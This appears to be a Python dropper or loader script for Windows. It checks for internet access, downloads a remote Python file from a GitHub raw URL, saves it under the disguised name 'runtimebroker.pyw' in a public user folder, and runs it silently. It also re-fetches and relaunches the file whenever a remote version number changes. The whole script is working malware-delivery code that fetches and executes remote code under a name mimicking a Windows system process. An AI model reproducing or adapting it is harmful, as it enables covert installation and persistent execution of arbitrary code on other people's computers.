try:
    import os, sys, http.client as httplib, urllib.request, time, requests
except ImportError:
    pyd = str(sys.executable)
    os.system(pyd + " -m pip install -r C:/Users/Public/Documents/requirements.txt")

rawrepo = "https://raw.githubusercontent.com/benjaminloir/super-duper-broccoli"
pd = 'C:/Users/Public/Documents/Benjamin'

def connection():
    conn = httplib.HTTPConnection("www.google.com", timeout=3)
    try:
        conn.request("HEAD", "/")
        conn.close()
        return True
    except:
        return False

if (connection() == False):
	os._exit(1)

def setup():
    urllib.request.urlretrieve(rawrepo + '/main/areureal.py', '{}/runtimebroker.pyw'.format(pd))
    urllib.request.urlretrieve(rawrepo + '/main/requirements.txt', '{}/requirements.txt'.format(pd))
    urllib.request.urlretrieve(rawrepo + '/main/version', '{}/version'.format(pd))
    os.popen("{}/runtimebroker.pyw".format(pd))
    os._exit(1)
    
def checkupdate():
    r = requests.get(rawrepo + "/main/version")
    gitver = r.text
    with open('{}/version'.format(pd)) as f:
        curver = f.readline()
    if(gitver != curver):
        urllib.request.urlretrieve(rawrepo + '/main/areureal.py', '{}/runtimebroker.pyw'.format(pd))
        urllib.request.urlretrieve(rawrepo + '/main/requirements.txt', '{}/requirements.txt'.format(pd))
        urllib.request.urlretrieve(rawrepo + '/main/version', '{}/version'.format(pd))
        os.popen("{}/runtimebroker.pyw".format(pd))
        os._exit(1)
    else:
        return False

if (os.name == "nt"):
    if not os.path.exists('{}/runtimebroker.pyw'.format(pd)):
        setup()
    cu = checkupdate()
    if(cu == False):
        os.popen("{}/runtimebroker.pyw".format(pd))
        os._exit(1)
    